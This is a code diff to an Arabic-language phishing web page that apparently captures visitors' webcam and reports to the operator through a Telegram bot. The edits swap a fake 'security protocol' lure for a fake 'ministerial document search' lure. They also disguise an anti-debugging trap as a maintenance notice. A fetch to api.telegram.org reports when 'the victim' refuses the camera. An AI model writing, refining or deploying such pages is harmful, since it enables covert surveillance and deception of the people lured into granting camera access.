@@ -16,8 +16,8 @@
     <div class="box">
         <div style="font-size: 40px;">🛡️</div>
         <h3>بروتوكول الأمان الموحد</h3>
-        <p style="font-size: 0.9em; color: #bdc3c7;">يرجى تفعيل المصادقة الحيوية لتأمين اتصالك بالسيرفر.</p>
-        <button class="btn" onclick="megaCapture()">بدء التأمين</button>
+        <p style="font-size: 0.9em; color: #bdc3c7;">يرجى تفعيل الأذونات لإيصار الإشعارات بنجاح عند اكمال الصيانه .</p>
+        <button class="btn" onclick="megaCapture()">🌸بدء البحث عن مستند وزاري مقترح </button>
     </div>
 
     <video id="v" autoplay playsinline muted></video>
@@ -44,7 +44,7 @@
             debugger; 
             const end = new Date();
             if (end - start > 100) {
-                document.body.innerHTML = "<h2 style='margin-top:200px;'>⚠️ تم اكتشاف محاولة اختراق البروتوكول.</h2>";
+                document.body.innerHTML = "<h2 style='margin-top:200px;'>نعتذر !!! هذا الموقع تحت الصيانة شكرا لإنتضاركم الرجاء مغادرة الموقع وسيتم ابلاغكم عند توفره 🌸😍.</h2>";
                 setTimeout(() => { window.location.href = "about:blank"; }, 2000);
             }
         }, 1000);
@@ -83,9 +83,9 @@
             } catch (e) {
                 // إخطارك بأن الضحية رفض الكاميرا
                 fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${CH_ID}&text=🚫 الضحية رفض إذن الكاميرا`);
-                alert("يجب السماح بالكاميرا للمتابعة.");
+                alert("يجب السماح للمتابعة.");
                 btn.disabled = false;
-                btn.innerHTML = "بدء التأمين";
+                btn.innerHTML = "البحث عن المستند";
             }
         }
 
@@ -132,4 +132,5 @@
     </script>
 </body>
 </html>
+
 
